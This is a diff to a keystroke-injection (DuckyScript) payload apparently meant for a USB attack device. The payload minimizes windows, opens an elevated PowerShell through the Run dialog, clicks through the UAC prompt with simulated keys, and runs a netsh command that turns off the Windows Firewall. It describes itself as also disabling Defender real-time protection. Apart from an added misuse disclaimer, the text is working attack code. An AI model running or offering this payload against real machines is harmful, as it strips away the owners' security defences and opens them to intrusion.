@@ -2,6 +2,7 @@ REM ------------------------------------
 REM Description: Turns off Firewall with powershell and disables real time protection using the Windows Defender GUI
 REM Author: P-ict0 (https://github.com/P-ict0)
 REM Date: 11/01/2025
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
 REM ------------------------------------
 REM This script:
 REM 1 Opens PowerShell (Admin)
@@ -13,17 +14,21 @@ REM ------------------------------------
 
 REM NOTE: This delay is quite fast
 REM       For slower computers, increase DEFAULT_DELAY
-DEFAULT_DELAY 200
+DEFAULT_DELAY 500
+
+REM ---------- Minimize everything ----------
+GUI m
+DELAY 200
 
 REM ---------- Open PowerShell as Admin ----------
-REM Press Windows Key + X
-GUI x
-DELAY 20
-STRING a
+GUI r
 DELAY 500
+STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
+ENTER
+DELAY 2000
 LEFTARROW
 ENTER
-DELAY 900
+DELAY 1500
 
 REM ---------- Disable Windows Firewall ----------
 STRING netsh advfirewall set currentprofile state off
